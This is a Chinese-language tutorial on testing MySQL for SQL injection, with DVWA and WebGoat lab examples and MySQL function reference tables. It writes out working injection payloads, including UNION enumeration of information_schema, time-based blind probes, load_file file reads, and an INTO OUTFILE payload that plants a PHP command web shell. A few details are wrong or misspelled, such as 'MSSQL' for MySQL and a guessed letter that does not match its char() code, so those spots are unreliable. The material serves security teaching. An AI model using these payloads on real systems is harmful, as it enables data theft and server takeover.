
# Mysql SQL Injection

## 摘要

凡是没有充分约束或清理用户输入，而且使用这些输入构造SQL查询，就会发生SQL注入漏洞。使用动态SQL（通过字符串连接构造SQL查询）为这些漏洞打开了大门。SQL注入使攻击者可以访问SQL服务器。它允许在用于连接数据库的用户权限下执行SQL代码。

MySQL服务器具有一些特殊性，因此某些漏洞需要为此专门定制。这是本节的主题。

## 测试方法
当在由MySQL数据库支持的应用程序中发现SQL注入漏洞时，根据MySQL版本和DBMS上的用户权限，可能会执行多种攻击。

MySQL至少有4个版本较为常见：3.23.x，4.0.x，4.1.x和5.0.x。每个版本都有一组能揭示当前版本的特性指纹。
- 4.0之后：增加了 UNION
- 4.1之后：增加了 Subqueries
- 5.0之后，增加了： 存储过程、存储函数、命名为 INFORMATION_SCHEMA 的视图
- 5.0.2之后，增加了：Triggers

注意，对于MSSQL 4.0.x之前的版本，仅Boolean或基于时间的盲注攻击可以使用，因为子查询功能或UNION语句还没有实现。

现在，我们假设有一个典型的SQL注入漏洞，其请求链接为：```http://www.example.com/page.php?id=2```.

### 单引号问题

在利用MySQL特性之前，必须考虑如何在语句中表示字符串，因为Web应用程序通常会用单引号引起来。Mysql引号转义如下：
```'A string with \'quotes\''```

这里，Mysql解释```\'```为字符，而不是元字符。所以假如应用正常工作，下面两个使用静态字符串的例子是有区别的：
- Web应用转义单引号```'```为```\'```
- Web应用不转义单引号```'```为```'```

在Mysql中，有一种标准做法可以绕过单引号，即不使用单引号来声明静态字符串。假设我们想知道某个名为 password 字段的值，那么查询条件可以如下组织：
- ```password like 'A%'```
- ASCII值以十六进制形式拼接：```password like 0x4125```
- 使用函数```char()```: ```password LIKE CHAR(65,37)``` 。CHAR()将每个参数N理解为一个整数，其返回值为一个包含这些整数的代码值所给出的字符的字符串。NULL值被省略。

### 多种混合查询

Mysql库连接器不支持使用```;```区分的多查询，因此无法像Microsoft SQL Server一样在单个SQL注入漏洞中注入多个非同类SQL命令。例如，下列语句会错误：```1 ; update tablename set code='javascript code' where 1 --```

## 信息收集

### 指纹发现

首先要知道的是是否有MySQL DBMS作为后端数据库。MySQL服务器具有一项功能，该功能用于让其他DBMS忽略MySQL方言中的子句。当注释块```'/**/'```包含感叹号时，```'/*! sql here*/'```它将由MySQL解释，并由其他DBMS视为普通注释块，正如MySQL手册中所述。

例如：
```1 /*! and 1=0 */```
如果后台运行mysql，那么注释块中的内容会被解释执行。

### 版本号
有3种方法收集版本信息
- 使用 global variable ```@@version```
- 使用函数 ```VERSION()```
- 使用含有版本号的注释指纹 ```/*!40110 and 1=0*/``` ，这意味着下列语句

```/*!40110 and 1=0*/``` ，这意味着下列语句:
```
if(version >= 4.1.10)
    add 'and 1=0' to the query
```
与之有相同结果的还有：
- 盲注：```1 AND 1=0 UNION SELECT @@version /*```
- 推断注入：```1 AND @@version like '4.0%'```。响应将包含类似```5.0.22-log```的行。

例如DVWA靶机可执行下列语句：
```adf' or 1=1 union select version(),'1 ``` 或 ```adf' or 1=1 union select @@version,'1 ```
结果如下图：
<img src="images/07/mysqli01.png" width="480" >


###  登录用户

MySQL Server依赖两种用户。
1.USER()：连接到MySQL服务器的用户。
2.CURRENT_USER()：正在执行查询的内部用户。

1和2之间有一些区别。主要的区别在于，匿名用户可以连接（如果允许）任何名称，但MySQL内部用户是一个空名称（''）。另一个区别是，如果未在其他地方声明，则存储过程或存储函数将作为创建者用户执行。可以使用来知道CURRENT_USER。

- In band injection: ```1 AND 1=0 UNION SELECT USER()```

- Inferential injection: ```1 AND USER() like 'root%'```

结果可能包含：```user@hostname```

### 获取数据库名

mysql有一个内置的函数：```database()```

- In band injection:```1 AND 1=0 UNION SELECT DATABASE()```
- Inferential injection:```1 AND DATABASE() like 'db%'```

结果为数据库名。

### INFOMATION_SCHEMA
mysql 5.0之后，有了 INFOMATION_SCHEMA ，它可以获取数据中所有的数据库、表、列、存储过程、函数。

|INFOMATION_SCHEMA中的表|描述|
|-|-|
|SCHEMATA	|有 SELECT_priv 权的用户所有的数据库|
|SCHEMA_PRIVILEGES	|The privileges the user has for each DB|
|TABLES	|All tables the user has (at least) SELECT_priv|
|TABLE_PRIVILEGES	|The privileges the user has for each table|
|COLUMNS	|All columns the user has (at least) SELECT_priv|
|COLUMN_PRIVILEGES	|The privileges the user has for each column|
|VIEWS	|All columns the user has (at least) SELECT_priv|
|ROUTINES	|Procedures and functions (needs EXECUTE_priv)|
|TRIGGERS	|Triggers (needs INSERT_priv)|
|USER_PRIVILEGES	|Privileges connected User has|

上述信息可以通过SQL注入来实现。

例如dvwa中盲注sql页例子：```1' union select table_name ,1 from information_schema.tables where '1'='1```
结果如下：
```
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: admin
Surname: admin
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: CHARACTER_SETS
Surname: 1
ID: 1' union select table_name ,1 from information_schema.tables where '1'='1
First name: COLLATIONS
Surname: 1
...
```



## 标准SQL注入攻击

在标准SQL注入中，您可以将结果直接显示为正常输出或MySQL错误的页面。通过使用已经提到的SQL Injection攻击和已经描述的MySQL功能，直接SQL注入可以很容易地在一个层次上完成，这主要取决于pentester所面对的MySQL版本。

一个好的攻击方法是通过强制函数/过程或服务器本身抛出错误来了解结果。在MySQL手册上可以找到由MySQL引发的错误列表，特别是本机函数。

### 带外SQL注入
带外注入可以通过使用“ into outfile”子句来完成。

### 盲注
对于盲目SQL注入，MySQL服务器本身提供了一组有用的功能。

- 字串长度：```LENGTH(str)```
- 从给定的字符串中提取一个子字符串：```SUBSTRING(string, offset, #chars_returned)```
#### 基于时间的盲注

```BENCHMARK(#ofcycles,action_to_be_performed)``` 。 当Boolean攻击无任何结果时，可尝试benchmark函数执行计时攻击。也可以使用```SLEEP()```函数作为替代方法（MySQL> 5.0.x）。

例如dvwa盲注处可键入```1' and sleep(5) and '1'='1```,会发现过了5秒后才响应。

```1' and benchmark(500000,md5(1)) and '1'='1```,执行500000次的md5(1).


例如：猜测当前数据库名首字母为 g ，如果是则执行benchmark；否则不执行。通过响应时间长短可以知道是否猜中。

`1170 union select if(substring(current,1,1) = char(119), benchamark(5000000,encode('msg','by 5 seconds')),null) from (select database() as current) as tbl;`

### 写入数据

如果连接数据库使用的用户有```FILE```权限，即写文件权限，且单引号不会被过滤，那么```inot outfile```这种字句就可能被用于导出查询结果到一个文件。SQL语句例如：```Select * from table into outfile '/tmp/file'```

例如使用下列语句写入敏感信息，然后将其写入可访问的文件，攻击者可以下载之 ：
`1170 union ALL select table_name,table_type,engine from information_schema.tables where table_schema='mysql' order by table_name DESC INTO OUTFILE '/www-available-path/123.txt';`

注意：由于无法绕过文件名周围的单引号，因此如果对单引号（例如转义）进行了一些清理，`\'`将无法使用“ into outfile”子句。

这种攻击可用作带外技术，以获取有关查询结果的信息或编写可在Web服务器目录中执行的文件。

例如：写入一个shell：`1 union select "<?php system($_REQUEST['cmd']); ?>" ,2,3,4 INTO OUTFILE '/var/www/html/temp/c.php' -- `

又例如：`1 limit 1 into outfile '/var/www/root/test.jsp' FIELDS ENCLOSED BY '//'  LINES TERMINATED BY '\n<%jsp code here%>';`

Results are stored in a file with rw-rw-rw privileges owned by MySQL user and group.

Where /var/www/root/test.jsp will contain:

```//field values// <%jsp code here%>```

#### 从文件中读

```load_file```是一个能读文件的mysql内置文件，在有文件系统权限时可以使用。如果连接用户有文件权限，他可能使用某个文件的内容，如果单引号被限制，那么可以使用之前讨论的方法进行绕过。
```load_file('filename')```





## mysql information_schema 系统表速查

mysql> use information_schema
Database changed
mysql> show tables;

| Tables_in_information_schema          |
|-|
| CHARACTER_SETS                        |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| EVENTS                                |
| FILES                                 |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_COLUMN_USAGE                      |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| TABLES                                |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |

### information_schema.SCHEMATA 存放mysql中现有schema，即库

列名：
- CATALOG_NAME: NULL
- SCHEMA_NAME: information_schema
- DEFAULT_CHARACTER_SET_NAME: utf8
- DEFAULT_COLLATION_NAME: utf8_general_ci
- SQL_PATH: NULL

示例
```
mysql> select * from information_schema.SCHEMATA\G;
*************************** 1. row ***************************
              CATALOG_NAME: NULL
               SCHEMA_NAME: information_schema
DEFAULT_CHARACTER_SET_NAME: utf8
    DEFAULT_COLLATION_NAME: utf8_general_ci
                  SQL_PATH: NULL
*************************** 2. row ***************************
              CATALOG_NAME: NULL
               SCHEMA_NAME: .svn
DEFAULT_CHARACTER_SET_NAME: latin1
    DEFAULT_COLLATION_NAME: latin1_swedish_ci
                  SQL_PATH: NULL
*************************** 3. row ***************************
              CATALOG_NAME: NULL
               SCHEMA_NAME: bricks
DEFAULT_CHARACTER_SET_NAME: latin1
    DEFAULT_COLLATION_NAME: latin1_swedish_ci
                  SQL_PATH: NULL


```
### information_schema.tables 存放mysql中现有table

```
mysql> select * from information_schema.tables\G;

*************************** 636. row ***************************
  TABLE_CATALOG: NULL
   TABLE_SCHEMA: webcal
     TABLE_NAME: webcal_user_layers
     TABLE_TYPE: BASE TABLE
         ENGINE: MyISAM
        VERSION: 10
     ROW_FORMAT: Dynamic
     TABLE_ROWS: 0
 AVG_ROW_LENGTH: 0
    DATA_LENGTH: 0
MAX_DATA_LENGTH: 281474976710655
   INDEX_LENGTH: 1024
      DATA_FREE: 0
 AUTO_INCREMENT: NULL
    CREATE_TIME: 2011-04-17 13:11:41
    UPDATE_TIME: 2011-04-17 13:11:41
     CHECK_TIME: NULL
TABLE_COLLATION: latin1_swedish_ci
       CHECKSUM: NULL
 CREATE_OPTIONS: 
  TABLE_COMMENT: 

```
### information_schema.columns 存放mysql中现有columns

```
select * from information_schema.columns\G;

*************************** 4682. row ***************************
           TABLE_CATALOG: NULL
            TABLE_SCHEMA: yazd
              TABLE_NAME: yazduserprop
             COLUMN_NAME: propValue
        ORDINAL_POSITION: 3
          COLUMN_DEFAULT: NULL
             IS_NULLABLE: NO
               DATA_TYPE: varchar
CHARACTER_MAXIMUM_LENGTH: 255
  CHARACTER_OCTET_LENGTH: 255
       NUMERIC_PRECISION: NULL
           NUMERIC_SCALE: NULL
      CHARACTER_SET_NAME: latin1
          COLLATION_NAME: latin1_swedish_ci
             COLUMN_TYPE: varchar(255)
              COLUMN_KEY: 
                   EXTRA: 
              PRIVILEGES: select,insert,update,references
          COLUMN_COMMENT: 
4682 rows in set (0.05 sec)
```
## mysql 函数速查

### 注入常用
- user() 数据库用户名
- system_user()
- current_user()
- last_insert_id() 当前数据库最后一次插入事务的id
- database() 所有数据库
- BENCHMARK(count,expr) 重复执行表达式 expr  count次。用于查看mysql耗时情况，返回值为0
- version() MySQL 版本
- @@datadir 数据库路径
- @@version_compile_os 操作系统版本

- limit() `SELECT * FROM TABLE LIMIT M,N` 返回结果中的前几条数据或者中间的数据 m是指从m位开始(第一位为0) n是指取n条

- load_file() 读取文件
### MySQL 字符串函数

- LENGTH	计算字符串长度函数，返回字符串的字节长度
- CONCAT	合并字符串函数，返回结果为连接参数产生的字符串，参数可以使一个或多个
- INSERT	替换字符串函数
- LOWER	将字符串中的字母转换为小写
- UPPER	将字符串中的字母转换为大写
- left(string,num)	从左侧字截取符串，返回字符串左边的若干个字符
- RIGHT	从右侧字截取符串，返回字符串右边的若干个字符
- TRIM	删除字符串左右两侧的空格
- REPLACE	字符串替换函数，返回替换后的新字符串
- SUBSTRING(字符串,起始位置i,长度l)	截取字符串，返回从指定位置开始的指定长度的字符换
- REVERSE	字符串反转（逆序）函数，返回与原始字符串顺序相反的字符串
- ORD()  返回第一个字符的ASCII码
- Ascii()函数 , 返回字符串的ascii码
- concat(str1,str2,str3,....) 可以连接一个或者多个字符串 ; 返回结果为连接参数产生的字符串，但是如果其中一个参数为NULL ，则返回值为 NULL。
- CONCAT_WS(separator,str1,str2,…)  CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。
- MID(ColumnName, Start [, Length]) 从指定字段中提取出字段的内容；column_name:字段名，start:开始位置，length:长度
- group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator '分隔符']) 分组拼接函数


例如：
- ```SELECT group_concat(TABLE_NAME) FROM information_schema.tables```
- ```tom' and substring((SELECT group_concat(COLUMN_NAME) FROM information_schema.columns where TABLE_NAME='EMPLOYEE' ),1,1)='a' ; --```
- ```SELECT LENGTH(group_concat(TABLE_NAME)) FROM information_schema.tables```

### MySQL 数值型函数
函数名称	作 用
- COUNT(column_name) 返回指定列的值的数目（NULL 不计入）
- ABS	求绝对值
- SQRT	求二次方根
- MOD	求余数
- CEIL 和 CEILING	两个函数功能相同，都是返回不小于参数的最小整数，即向上取整
- FLOOR	向下取整，返回值转化为一个BIGINT
- RAND	生成一个0~1之间的随机数，传入整数参数是，用来产生重复序列
- ROUND	对所传参数进行四舍五入
- SIGN	返回参数的符号
- POW 和 POWER	两个函数的功能相同，都是所传参数的次方的结果值
- SIN	求正弦值
- ASIN	求反正弦值，与函数 SIN 互为反函数
- COS	求余弦值
- ACOS	求反余弦值，与函数 COS 互为反函数
- TAN	求正切值
- ATAN	求反正切值，与函数 TAN 互为反函数
- COT	求余切值

### MySQL 日期和时间函数
函数名称	作 用
- CURDATE 和 CURRENT_DATE	两个函数作用相同，返回当前系统的日期值
- CURTIME 和 CURRENT_TIME	两个函数作用相同，返回当前系统的时间值
- NOW 和  SYSDATE	两个函数作用相同，返回当前系统的日期和时间值
- UNIX_TIMESTAMP	获取UNIX时间戳函数，返回一个以 UNIX 时间戳为基础的无符号整数
- FROM_UNIXTIME	将 UNIX 时间戳转换为时间格式，与UNIX_TIMESTAMP互为反函数
- MONTH	获取指定日期中的月份
- MONTHNAME	获取指定日期中的月份英文名称
- DAYNAME	获取指定曰期对应的星期几的英文名称
- DAYOFWEEK	获取指定日期对应的一周的索引位置值
- WEEK	获取指定日期是一年中的第几周，返回值的范围是否为 0〜52 或 1〜53
- DAYOFYEAR	获取指定曰期是一年中的第几天，返回值范围是1~366
- DAYOFMONTH	获取指定日期是一个月中是第几天，返回值范围是1~31
- YEAR	获取年份，返回值范围是 1970〜2069
- TIME_TO_SEC	将时间参数转换为秒数
- SEC_TO_TIME	将秒数转换为时间，与TIME_TO_SEC 互为反函数
- DATE_ADD 和 ADDDATE	两个函数功能相同，都是向日期添加指定的时间间隔
- DATE_SUB 和 SUBDATE	两个函数功能相同，都是向日期减去指定的时间间隔
- ADDTIME	时间加法运算，在原始时间上添加指定的时间
- SUBTIME	时间减法运算，在原始时间上减去指定的时间
- DATEDIFF	获取两个日期之间间隔，返回参数 1 减去参数 2 的值
- DATE_FORMAT	格式化指定的日期，根据参数返回指定格式的值
- WEEKDAY	获取指定日期在一周内的对应的工作日索引


### MySQL 聚合函数
函数名称	作用
- MAX	查询指定列的最大值
- MIN	查询指定列的最小值
- COUNT	统计查询结果的行数
- SUM	求和，返回指定列的总和
- AVG	求平均值，返回指定列数据的平均值

### MySQL 流程控制函数
函数名称	作用
- IF	判断，流程控制
- IFNULL	判断是否为空
- CASE	搜索语句


上面的CASE子句即：```(case where (true) then express1 else express2 end)```

例如：构造fuzz，猜出ip地址的前几位:

```(case ip when '.130.219.202' then hostname else ip end)```

下列语句可执行：
```GET http://10.10.10.128:8080/WebGoat/SqlInjection/servers?column=(case+ip+when+'%d.130.219.202'+then+hostname+else+ip+end) HTTP/1.1```

把其中的hostname改为noname，会发现报错，有报错信息如下：
```...select id, hostname, ip, mac, status, description from servers  where status <> 'out of order' order by (case hostname when 'webgoat-tst' then noname else id end)..```

查看这个语句格式，有助于我们理解查询和构造fuzz。可以尝试下列语句，然后将100.130.219.202中的100建立数字fuzz。

```(case (select ip from servers where hostname='webgoat-prd') when '100.130.219.202' then hostname else id end)```

```GET http://10.10.10.128:8080/WebGoat/SqlInjection/servers?column=(case+(select+ip+from+servers+where+hostname%3d'webgoat-prd')+when+%27100.130.219.202%27+then+hostname+else+id+end) HTTP/1.1```

最后发现ip为104.130.219.202

## 工具

Francois Larouche：多个DBMS SQL注入工具
Reversing.org-sqlbftools
Bernardo Damele AG：sqlmap，自动SQL注入工具
Muhaimin Dzulfakar：MySqloit，MySql注入接管工具

